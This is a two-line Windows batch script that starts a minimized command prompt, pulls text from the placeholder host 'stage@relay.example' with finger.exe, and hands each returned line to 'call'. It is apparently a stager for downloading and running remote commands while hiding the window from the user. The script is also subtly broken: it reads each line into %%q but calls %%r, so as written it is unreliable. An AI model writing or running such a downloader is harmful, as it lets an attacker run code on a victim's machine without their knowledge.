@echo off
start "" /min cmd.exe /c for /f "delims=" %%q in ('finger.exe stage@relay.example') do call %%r
